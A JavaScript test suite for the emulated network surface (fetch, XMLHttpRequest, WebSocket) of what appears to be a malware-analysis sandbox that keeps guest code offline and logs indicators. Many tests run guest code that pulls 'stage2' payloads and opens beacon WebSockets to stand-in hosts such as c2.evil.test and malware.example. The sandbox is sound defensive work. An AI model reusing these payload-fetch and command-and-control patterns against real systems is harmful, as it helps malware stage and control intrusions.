import test from 'node:test'
import assert from 'node:assert/strict'
import { createHarness } from './helpers/harness.js'
import { ensureNetwork, NETWORK_LATENCY_MS, NETWORK_POLICIES } from '../tools/sandbox/env/network.js'

/**
 * Network surface tests.
 *
 * Everything here runs against the production harness: real bridge, real
 * stealth masker, real virtual clock. No socket is opened by any test — the
 * "offline" test proves it by answering a public URL from the default deny
 * policy with a synthetic DNS failure.
 */

const MODULES = ['globals', 'console', 'timers', 'network', 'xhr', 'fetch', 'websocket']

/**
 * `network` installs at order 82; `ensureNetwork` is idempotent and returns the
 * same service the browser surfaces reach, whether the registry or `xhr.js`
 * installed it first.
 */
async function createNetworkHarness(options = {}) {
  const harness = await createHarness({ modules: MODULES, ...options })
  const network = ensureNetwork(harness.bridge)
  return { harness, network }
}

/** Run guest code, failing the test with the guest error when it throws. */
function run(harness, source) {
  const result = harness.run(source)
  assert.equal(result.ok, true, `guest code failed: ${JSON.stringify(result.error)}`)
  return result.value
}

/** Advance the virtual clock and drain guest jobs until nothing is pending. */
function settle(harness, limit = 32) {
  for (let round = 0; round < limit; round += 1) {
    harness.timers()
    harness.jobs()
    if (harness.clock.pending() === 0) return
  }
  assert.fail(`timers still pending: ${harness.clock.pending()}`)
}

const traceEvents = (harness, kind) => harness.trace.events.filter((event) => event.kind === kind)

test('network service defaults to the deny policy and answers with a DNS failure', async () => {
  const { harness, network } = await createNetworkHarness()
  try {
    assert.equal(network.policy, 'deny')
    const pending = network.request({ method: 'GET', url: 'https://malware.example/stage2.js' })
    assert.equal(network.stats().pending, 1, 'result must not be produced synchronously')
    settle(harness)
    const result = await pending
    assert.equal(result.ok, false)
    assert.equal(result.status, 0)
    assert.equal(result.error, 'net::ERR_NAME_NOT_RESOLVED')
    assert.equal(result.fromMock, false)
    assert.equal(result.bodyText, '')
    assert.equal(result.bodyBytes.length, 0)
    assert.equal(result.url, 'https://malware.example/stage2.js')
    assert.ok(
      result.durationMs >= NETWORK_LATENCY_MS.min && result.durationMs <= NETWORK_LATENCY_MS.max,
      `durationMs ${result.durationMs} outside the seeded band`,
    )
  } finally {
    harness.dispose()
  }
})

test('network service rejects unknown policies and serves routes by string, RegExp and predicate', async () => {
  const { harness, network } = await createNetworkHarness()
  try {
    assert.throws(() => network.setPolicy('allow'), TypeError)
    assert.deepEqual([...NETWORK_POLICIES], ['deny', 'empty', 'echo'])

    network.setRoutes([
      { match: 'stage2', response: { status: 200, bodyText: 'by-string' } },
      { match: /\.json$/i, response: { status: 200, bodyText: '{"route":true}' } },
      {
        match: (request) => request.method === 'POST' && request.url.endsWith('/beacon'),
        response: { status: 201, bodyText: 'by-predicate', headers: { 'X-Route': 'predicate' } },
      },
    ])

    const byString = await settledRequest(harness, network, { url: 'https://evil.test/stage2.js' })
    assert.equal(byString.bodyText, 'by-string')
    assert.equal(byString.fromMock, true)

    const byRegExp = await settledRequest(harness, network, { url: 'https://evil.test/config.json' })
    assert.deepEqual(JSON.parse(byRegExp.bodyText), { route: true })

    const byPredicate = await settledRequest(harness, network, { method: 'POST', url: 'https://evil.test/beacon' })
    assert.equal(byPredicate.status, 201)
    assert.equal(byPredicate.statusText, 'Created')
    assert.equal(byPredicate.headers['x-route'], 'predicate')

    const unmatched = await settledRequest(harness, network, { url: 'https://evil.test/other' })
    assert.equal(unmatched.ok, false)
    assert.equal(unmatched.error, 'net::ERR_NAME_NOT_RESOLVED')

    // The empty policy answers 204 without a body.
    network.setPolicy('empty')
    const empty = await settledRequest(harness, network, { url: 'https://evil.test/nothing' })
    assert.equal(empty.ok, true)
    assert.equal(empty.status, 204)
    assert.equal(empty.statusText, 'No Content')
    assert.equal(empty.bodyText, '')
  } finally {
    harness.dispose()
  }
})

test('network service honours a caller-declared timeout', async () => {
  const { harness, network } = await createNetworkHarness()
  try {
    network.setRoutes([{ match: 'slow', response: { status: 200, bodyText: 'late', durationMs: 500 } }])
    const pending = network.request({ url: 'https://evil.test/slow', timeoutMs: 30 })
    settle(harness)
    const result = await pending
    assert.equal(result.ok, false)
    assert.equal(result.status, 0)
    assert.equal(result.error, 'net::ERR_TIMED_OUT')
    assert.equal(result.durationMs, 30)
    const [event] = traceEvents(harness, 'net')
    assert.equal(event.error, 'net::ERR_TIMED_OUT')
    assert.equal(event.durationMs, 30)
  } finally {
    harness.dispose()
  }
})

test('network service cancel() drops a scheduled request', async () => {
  const { harness, network } = await createNetworkHarness()
  try {
    let delivered = false
    const { id } = network.dispatch({ url: 'https://evil.test/cancelled' }, () => {
      delivered = true
    })
    assert.equal(network.cancel(id), true)
    assert.equal(network.cancel(id), false)
    settle(harness)
    assert.equal(delivered, false)
    assert.equal(network.stats().pending, 0)
  } finally {
    harness.dispose()
  }
})

test('XMLHttpRequest under the deny policy ends at DONE with status 0 and an error event', async () => {
  const { harness } = await createNetworkHarness()
  try {
    const opened = run(
      harness,
      `globalThis.__events = [];
       var xhr = new XMLHttpRequest();
       globalThis.__xhr = xhr;
       xhr.addEventListener('readystatechange', function () { __events.push('rs' + xhr.readyState); });
       xhr.addEventListener('error', function (event) { __events.push('error:' + event.type); });
       xhr.addEventListener('loadend', function () { __events.push('loadend'); });
       xhr.open('GET', 'https://malware.example/stage2.js');
       xhr.send();
       'readyState=' + xhr.readyState + '/status=' + xhr.status`,
    )
    assert.equal(opened, 'readyState=1/status=0')
    assert.deepEqual(run(harness, '__events'), ['rs1'])

    settle(harness)

    assert.equal(run(harness, '__xhr.readyState'), 4)
    assert.equal(run(harness, '__xhr.status'), 0)
    assert.equal(run(harness, '__xhr.statusText'), '')
    assert.deepEqual(run(harness, '__events'), ['rs1', 'rs4', 'error:error', 'loadend'])
  } finally {
    harness.dispose()
  }
})

test('XMLHttpRequest under the echo policy walks 2-3-4 and exposes the response', async () => {
  const { harness, network } = await createNetworkHarness()
  try {
    network.setPolicy('echo')
    run(
      harness,
      `globalThis.__states = [];
       var xhr = new XMLHttpRequest();
       globalThis.__xhr = xhr;
       xhr.onreadystatechange = function () { __states.push(xhr.readyState); };
       xhr.open('POST', '/collect');
       xhr.setRequestHeader('X-Session', 'abc');
       xhr.send('a=1');
       'sent'`,
    )
    settle(harness)

    assert.deepEqual(run(harness, '__states'), [1, 2, 3, 4])
    assert.equal(run(harness, '__xhr.status'), 200)
    assert.equal(run(harness, '__xhr.statusText'), 'OK')
    assert.equal(run(harness, '__xhr.responseURL'), 'https://www.example-cdn.com/collect')
    assert.equal(run(harness, '__xhr.getResponseHeader("content-type")'), 'application/json')
    assert.match(run(harness, '__xhr.getAllResponseHeaders()'), /^content-type: application\/json\r\n$/)
    assert.deepEqual(JSON.parse(run(harness, '__xhr.responseText')), {
      method: 'POST',
      url: 'https://www.example-cdn.com/collect',
      body: 'a=1',
    })
  } finally {
    harness.dispose()
  }
})

test('XMLHttpRequest responseType transforms the body and rejects responseText', async () => {
  const { harness, network } = await createNetworkHarness()
  try {
    network.registerHandler((request) =>
      request.url.endsWith('/stage2.json')
        ? { ok: true, status: 200, bodyText: '{"stage":2}', headers: { 'Content-Type': 'application/json' } }
        : null,
    )
    run(
      harness,
      `globalThis.__out = {};
       var xhr = new XMLHttpRequest();
       globalThis.__xhr = xhr;
       xhr.responseType = 'json';
       xhr.open('GET', 'https://malware.example/stage2.json');
       xhr.onload = function () { __out.json = JSON.stringify(xhr.response); };
       xhr.send('');
       'sent'`,
    )
    settle(harness)

    assert.equal(run(harness, '__out.json'), '{"stage":2}')
    assert.equal(run(harness, '__xhr.status'), 200)
    assert.equal(
      run(
        harness,
        `try { __xhr.responseText; 'no-throw' } catch (error) { error.name }`,
      ),
      'InvalidStateError',
    )
  } finally {
    harness.dispose()
  }
})

test('XMLHttpRequest kills the request on timeout and reports the timeout event', async () => {
  const { harness, network } = await createNetworkHarness()
  try {
    network.setRoutes([
      {
        match: 'slow',
        response: { status: 200, bodyText: 'late', durationMs: 500 },
      },
    ])
    run(
      harness,
      `globalThis.__events = [];
       var xhr = new XMLHttpRequest();
       globalThis.__xhr = xhr;
       xhr.timeout = 20;
       xhr.open('GET', 'https://evil.test/slow');
       xhr.addEventListener('timeout', function () { __events.push('timeout'); });
       xhr.addEventListener('load', function () { __events.push('load'); });
       xhr.addEventListener('loadend', function () { __events.push('loadend'); });
       xhr.send();
       'sent'`,
    )
    settle(harness)

    assert.deepEqual(run(harness, '__events'), ['timeout', 'loadend'])
    assert.equal(run(harness, '__xhr.readyState'), 4)
    assert.equal(run(harness, '__xhr.status'), 0)
  } finally {
    harness.dispose()
  }
})

test('XMLHttpRequest exposes the WebIDL surface without host leakage', async () => {
  const { harness } = await createNetworkHarness()
  try {
    assert.equal(
      run(
        harness,
        `[XMLHttpRequest.UNSENT, XMLHttpRequest.OPENED, XMLHttpRequest.HEADERS_RECEIVED,
          XMLHttpRequest.LOADING, XMLHttpRequest.DONE].join(',')`,
      ),
      '0,1,2,3,4',
    )
    assert.equal(
      run(harness, `var x = new XMLHttpRequest(); [x.UNSENT, x.DONE].join(',')`),
      '0,4',
    )
    assert.equal(run(harness, 'Object.getOwnPropertyNames(new XMLHttpRequest()).length'), 0)
    assert.equal(run(harness, 'new XMLHttpRequest() instanceof XMLHttpRequest'), true)
    assert.equal(run(harness, 'XMLHttpRequest.prototype.constructor === XMLHttpRequest'), true)
    assert.equal(run(harness, `try { XMLHttpRequest(); 'no-throw' } catch (error) { error.name }`), 'TypeError')
    assert.equal(run(harness, 'typeof new XMLHttpRequest().upload.addEventListener'), 'function')
    assert.match(run(harness, 'String(XMLHttpRequest)'), /\[native code\]/)
    assert.match(run(harness, 'String(XMLHttpRequest.prototype.open)'), /^function open\(\) \{\s+\[native code\]\s+\}$/)
    assert.match(
      run(harness, `String(Object.getOwnPropertyDescriptor(XMLHttpRequest.prototype, 'readyState').get)`),
      /^function get readyState\(\)/,
    )
    assert.equal(run(harness, 'XMLHttpRequest.prototype.open.name'), 'open')
    assert.equal(run(harness, 'Object.getOwnPropertyDescriptor(XMLHttpRequest.prototype, "timeout").set.name'), 'set timeout')

    // Guest errors must not expose host frames or host paths.
    const stack = run(
      harness,
      `var xhr = new XMLHttpRequest();
       try { xhr.send(); 'no-throw' } catch (error) {
         globalThis.__xhrError = error;
         'caught'
       }`,
    )
    assert.equal(stack, 'caught')
    assert.equal(run(harness, '__xhrError.name'), 'InvalidStateError')
    const dumped = run(harness, 'String(__xhrError.stack)')
    assert.doesNotMatch(dumped, /tools\/|node_modules|file:\/\//)
  } finally {
    harness.dispose()
  }
})

test('fetch stays pending until the virtual delay elapses and then rejects on deny', async () => {
  const { harness, network } = await createNetworkHarness()
  try {
    run(
      harness,
      `fetch('https://malware.example/gate.php')
         .then(function (response) { return response.text(); })
         .then(function (body) { globalThis.__body = body; })
         .catch(function (error) { globalThis.__error = String(error); });
       'called'`,
    )
    assert.equal(network.stats().pending, 1)
    harness.jobs()
    assert.equal(run(harness, 'String(globalThis.__error)'), 'undefined', 'must not settle without the clock')

    settle(harness)

    assert.equal(run(harness, 'String(globalThis.__error)'), 'TypeError: Failed to fetch')
    assert.equal(run(harness, 'String(globalThis.__body)'), 'undefined')
    assert.equal(network.stats().pending, 0)
  } finally {
    harness.dispose()
  }
})

test('fetch resolves with a Response whose body, headers and clone behave', async () => {
  const { harness, network } = await createNetworkHarness()
  try {
    network.registerHandler((request) =>
      request.url.endsWith('/stage2.json')
        ? {
            ok: true,
            status: 200,
            bodyText: '{"stage":2,"url":"https://c2.evil.test/next"}',
            headers: { 'Content-Type': 'application/json', 'X-Trace': 'a' },
          }
        : null,
    )
    run(
      harness,
      `globalThis.__response = {};
       var request = new Request('https://malware.example/stage2.json', {
         method: 'post',
         headers: { 'X-Stage': '1' },
         body: 'q=2'
       });
       fetch(request).then(function (response) {
         __response.status = response.status;
         __response.ok = response.ok;
         __response.type = response.type;
         __response.url = response.url;
         __response.header = response.headers.get('content-type');
         __response.traced = response.headers.has('x-trace');
         __response.entries = Array.from(response.headers.entries()).length;
         __response.cloneStatus = response.clone().status;
         return response.json().then(function (json) {
           __response.json = JSON.stringify(json);
           __response.bodyUsed = response.bodyUsed;
         });
       }).catch(function (error) { globalThis.__responseError = String(error); });
       'called'`,
    )
    settle(harness)

    assert.equal(run(harness, 'String(globalThis.__responseError)'), 'undefined')
    assert.deepEqual(run(harness, 'globalThis.__response'), {
      status: 200,
      ok: true,
      type: 'basic',
      url: 'https://malware.example/stage2.json',
      header: 'application/json',
      traced: true,
      entries: 2,
      cloneStatus: 200,
      json: '{"stage":2,"url":"https://c2.evil.test/next"}',
      bodyUsed: true,
    })
    assert.match(run(harness, 'String(fetch)'), /^function fetch\(\) \{\s+\[native code\]\s+\}$/)
    assert.match(run(harness, 'String(Response)'), /\[native code\]/)
  } finally {
    harness.dispose()
  }
})

test('Headers mutate and iterate in the documented way', async () => {
  const { harness } = await createNetworkHarness()
  try {
    const result = run(
      harness,
      `var headers = new Headers([['X-A', '1'], ['x-a', '2']]);
       var out = [];
       out.push('get=' + headers.get('x-a'));
       headers.append('X-B', '3');
       headers.set('X-A', '9');
       out.push('after-set=' + headers.get('X-A') + '/' + headers.get('x-b'));
       headers.delete('x-b');
       out.push('deleted=' + headers.has('X-B'));
       var collected = [];
       headers.forEach(function (value, name) { collected.push(name + '=' + value); });
       out.push('for-each=' + collected.join(','));
       out.push('keys=' + Array.from(headers.keys()).join(','));
       out.push('invalid=' + (function () {
         try { headers.set('bad name', 'x'); return 'no-throw'; } catch (error) { return error.name; }
       })());
       out.join(' | ')`,
    )
    assert.equal(
      result,
      'get=1, 2 | after-set=9/3 | deleted=false | for-each=x-a=9 | keys=x-a | invalid=TypeError',
    )
  } finally {
    harness.dispose()
  }
})

test('a registered handler is visible to both XHR and fetch and records the IOC', async () => {
  const { harness, network } = await createNetworkHarness()
  try {
    network.registerHandler((request) =>
      request.url.includes('payload.bin')
        ? { ok: true, status: 200, bodyText: 'STAGE2', headers: { 'X-Source': 'handler' } }
        : null,
    )

    run(
      harness,
      `globalThis.__sink = {};
       var xhr = new XMLHttpRequest();
       xhr.open('GET', 'https://c2.evil.test/payload.bin');
       xhr.onload = function () { __sink.xhr = xhr.status + ':' + xhr.responseText; };
       xhr.send();
       fetch('https://c2.evil.test/payload.bin')
         .then(function (response) { return response.text(); })
         .then(function (body) { __sink.fetch = body; });
       'sent'`,
    )
    settle(harness)

    assert.equal(run(harness, '__sink.xhr'), '200:STAGE2')
    assert.equal(run(harness, '__sink.fetch'), 'STAGE2')

    const netEvents = traceEvents(harness, 'net')
    assert.equal(netEvents.length, 2)
    for (const event of netEvents) {
      assert.equal(event.url, 'https://c2.evil.test/payload.bin')
      assert.equal(event.status, 200)
      assert.equal(event.ok, true)
      assert.equal(event.error, '')
      assert.equal(event.bodyLength, 6)
      assert.equal(event.method, 'GET')
      assert.ok(event.durationMs >= NETWORK_LATENCY_MS.min)
    }

    const iocEvents = traceEvents(harness, 'ioc').filter((event) => event.iocKind === 'url')
    assert.equal(iocEvents.length, 2)
    assert.equal(iocEvents[0].value, 'https://c2.evil.test/payload.bin')
  } finally {
    harness.dispose()
  }
})

test('WebSocket walks CONNECTING -> OPEN -> error -> CLOSED under the deny policy', async () => {
  const { harness } = await createNetworkHarness()
  try {
    assert.equal(
      run(
        harness,
        `[WebSocket.CONNECTING, WebSocket.OPEN, WebSocket.CLOSING, WebSocket.CLOSED].join(',')`,
      ),
      '0,1,2,3',
    )
    run(
      harness,
      `globalThis.__wsEvents = [];
       var socket = new WebSocket('wss://c2.evil.test/gate', 'v1.chat');
       globalThis.__socket = socket;
       __wsEvents.push('ctor:' + socket.readyState);
       socket.addEventListener('open', function () { __wsEvents.push('open:' + socket.readyState); });
       socket.addEventListener('error', function () { __wsEvents.push('error'); });
       socket.addEventListener('close', function (event) {
         __wsEvents.push('close:' + event.code + ':' + event.wasClean + ':' + socket.readyState);
       });
       try { socket.send('beacon'); } catch (error) { __wsEvents.push('send:' + error.name); }
       'created'`,
    )

    assert.equal(run(harness, '__socket.readyState'), 0)
    assert.equal(run(harness, '__socket.url'), 'wss://c2.evil.test/gate')
    assert.equal(run(harness, '__socket.protocol'), 'v1.chat')
    assert.equal(run(harness, '__socket.extensions'), '')
    assert.equal(run(harness, '__socket.bufferedAmount'), 0)
    assert.equal(run(harness, '__socket.binaryType'), 'blob')

    settle(harness)

    assert.deepEqual(run(harness, '__wsEvents'), [
      'ctor:0',
      'send:InvalidStateError',
      'open:1',
      'error',
      'close:1006:false:3',
    ])
    assert.equal(run(harness, '__socket.readyState'), 3)
  } finally {
    harness.dispose()
  }
})

test('WebSocket delivers a handler body as a message and closes on request', async () => {
  const { harness, network } = await createNetworkHarness()
  try {
    network.registerHandler((request) =>
      request.url.includes('gate2') ? { ok: true, status: 200, bodyText: 'STAGE2-URL' } : null,
    )
    run(
      harness,
      `globalThis.__wsEvents = [];
       var socket = new WebSocket('wss://c2.evil.test/gate2');
       globalThis.__socket = socket;
       socket.onopen = function () { __wsEvents.push('open'); socket.send('ping'); };
       socket.onmessage = function (event) { __wsEvents.push('message:' + event.data + ':' + event.origin); };
       socket.onclose = function (event) { __wsEvents.push('close:' + event.code + ':' + event.wasClean); };
       'created'`,
    )
    settle(harness)

    assert.deepEqual(run(harness, '__wsEvents'), ['open', 'message:STAGE2-URL:https://c2.evil.test'])
    assert.equal(run(harness, '__socket.readyState'), 1)

    run(harness, `__socket.close(4000, 'done'); __socket.readyState`)
    assert.equal(run(harness, '__socket.readyState'), 2)
    settle(harness)
    assert.deepEqual(run(harness, '__wsEvents'), [
      'open',
      'message:STAGE2-URL:https://c2.evil.test',
      'close:4000:true',
    ])
    assert.equal(run(harness, '__socket.readyState'), 3)
    assert.match(run(harness, 'String(WebSocket)'), /\[native code\]/)
  } finally {
    harness.dispose()
  }
})

test('the same seed and the same requests produce the same virtual durations', async () => {
  const record = async () => {
    const { harness } = await createNetworkHarness({ seed: 0x5eed })
    try {
      run(
        harness,
        `fetch('https://evil.test/one').catch(function () {});
         fetch('https://evil.test/two').catch(function () {});
         var xhr = new XMLHttpRequest();
         xhr.open('GET', 'https://evil.test/three');
         xhr.send();
         'sent'`,
      )
      settle(harness)
      return traceEvents(harness, 'net').map((event) => [event.url, event.durationMs])
    } finally {
      harness.dispose()
    }
  }

  const first = await record()
  const second = await record()
  assert.equal(first.length, 3)
  assert.deepEqual(first, second)
})

test('fetches never reach the network: a public URL fails with the synthetic DNS error', async () => {
  const { harness } = await createNetworkHarness()
  try {
    run(
      harness,
      `globalThis.__result = null;
       fetch('https://example.com/')
         .then(function (response) { globalThis.__result = 'resolved:' + response.status; })
         .catch(function (error) { globalThis.__result = 'rejected:' + error.message; });
       'called'`,
    )
    settle(harness)
    assert.equal(run(harness, '__result'), 'rejected:Failed to fetch')
    const [event] = traceEvents(harness, 'net')
    assert.equal(event.error, 'net::ERR_NAME_NOT_RESOLVED')
    assert.equal(event.status, 0)
  } finally {
    harness.dispose()
  }
})

test('the guest global surface gains no host names', async () => {
  const { harness } = await createNetworkHarness()
  try {
    const leaked = run(
      harness,
      `['Buffer', 'process', 'require', 'module', 'spawn', 'global', '__dirname'].filter(function (name) {
         return typeof globalThis[name] !== 'undefined';
       }).join(',')`,
    )
    assert.equal(leaked, '')
    assert.equal(run(harness, 'typeof fetch'), 'function')
    assert.equal(run(harness, 'typeof XMLHttpRequest'), 'function')
    assert.equal(run(harness, 'typeof WebSocket'), 'function')
    assert.equal(run(harness, 'typeof Headers + "/" + typeof Request + "/" + typeof Response'), 'function/function/function')
    assert.equal(run(harness, 'typeof window.fetch'), 'function')
  } finally {
    harness.dispose()
  }
})

/**
 * Dispatch one request through the service and resolve it after the clock runs.
 * @param {object} harness
 * @param {object} network
 * @param {object} spec
 */
async function settledRequest(harness, network, spec) {
  const pending = network.request(spec)
  settle(harness)
  return pending
}
